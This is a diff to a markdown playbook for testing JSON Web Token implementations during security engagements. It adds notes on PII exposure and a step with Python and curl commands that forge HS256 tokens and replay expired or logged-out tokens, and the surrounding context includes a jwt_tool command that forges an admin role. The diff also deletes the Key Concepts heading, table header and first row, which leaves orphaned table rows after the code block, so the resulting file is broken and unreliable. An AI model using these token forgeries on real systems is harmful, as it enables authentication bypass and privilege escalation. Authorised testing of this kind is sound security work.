@@ -1,10 +1,6 @@
 ---
 name: testing-for-json-web-token-vulnerabilities
-description: Tests JWT implementations for algorithm confusion, "none" algorithm bypass,
-  kid/jku parameter injection, and weak secret exploitation using jwt_tool and Burp Suite's
-  JWT Editor extension, aiming to achieve authentication bypass and privilege escalation.
-  Use when assessing JWT-based auth/session management, OAuth2/OIDC token handling, or
-  SSO systems during a security engagement.
+description: Tests JWT implementations for algorithm confusion (RS256 to HS256), none-algorithm bypass, kid parameter injection, jku and x5u header injection, and weak-secret cracking using jwt_tool, hashcat, and Burp Suite's JWT Editor extension, aiming to achieve authentication bypass and privilege escalation. Use when you need a step-by-step attack playbook covering JWT header-injection and signature-forgery techniques during a web or API security engagement. Do not use for a broad JWT assessment spanning OAuth, OIDC, SSO, and microservice token handling - use exploiting-jwt-algorithm-confusion-attack.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -74,6 +70,17 @@ echo "<payload_base64>" | base64 -d
 # Example JWT header inspection
 # {"alg":"RS256","typ":"JWT","kid":"key-1"}
 # Look for: alg, kid, jku, jwk, x5u, x5c headers
+
+# Review the payload for sensitive claims / PII exposure
+# JWT payloads are only base64url-encoded (not encrypted in JWS),
+# so anything in the payload is readable by anyone holding the token.
+# Flag as a finding if the payload contains:
+# - PII (email, phone, physical address, full name, national IDs)
+# - Internal IDs or database references (user_id, tenant_id, object refs)
+# - Role/permission/entitlement claims that reveal authorization model
+# - Secrets, API keys, or session material
+# Recommend JWE (encrypted tokens) or moving sensitive data server-side
+# when confidential values are present in a JWS payload.
 ```
 
 ### Step 2 — Test "None" Algorithm Bypass
@@ -189,11 +196,42 @@ python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "discovered_secret" \
   -I -pc role -pv admin -pc sub -pv "admin@target.com"
 ```
 
-## Key Concepts
+### Step 7 — Test Token Lifetime, Expiration, and Revocation
+```bash
+# Once you know the signing secret (or on an unsigned/none-accepting server),
+# assess whether expiration is enforced and whether tokens can be revoked.
 
-| Concept | Description |
-|---------|-------------|
-| Algorithm Confusion | Switching from asymmetric (RS256) to symmetric (HS256) using public key as secret |
+# Test 1: Expired-token reuse (is exp enforced?)
+python3 << 'PYEOF'
+import jwt, time
+secret = "known_secret"
+# Token that expired 1 hour ago
+payload = {"sub": "user123", "role": "user",
+           "exp": int(time.time()) - 3600, "iat": int(time.time()) - 7200}
+print(jwt.encode(payload, secret, algorithm='HS256'))
+PYEOF
+curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer <EXPIRED_TOKEN>" \
+  https://target.example.com/api/profile
+# 200 => expired tokens accepted (exp not validated)
+
+# Test 2: Far-future / long-lived expiration accepted
+python3 -c "import jwt; print(jwt.encode({'sub':'user123','role':'user','exp':32503680000}, 'known_secret', algorithm='HS256'))"
+# exp = year 3000; flag if excessive lifetimes are honored
+
+# Test 3: Token reuse after logout (server-side revocation?)
+# 1. Capture a valid JWT before logout
+# 2. Call the logout endpoint
+curl -s -X POST -H "Authorization: Bearer <PRE_LOGOUT_TOKEN>" \
+  https://target.example.com/auth/logout
+# 3. Reuse the captured JWT
+curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer <PRE_LOGOUT_TOKEN>" \
+  https://target.example.com/api/profile
+# 200 => tokens are not revoked on logout (stateless JWT, no blocklist)
+
+# Test 4: Token reuse after password change
+# Capture JWT, change the account password, then replay the old JWT.
+# 200 => password change does not invalidate existing tokens.
+```
 | None Algorithm | Setting alg to "none" to create unsigned tokens accepted by misconfigured servers |
 | Kid Injection | Exploiting the Key ID header parameter for SQLi, path traversal, or SSRF |
 | JKU/X5U Injection | Pointing key source URLs to attacker-controlled servers for key substitution |
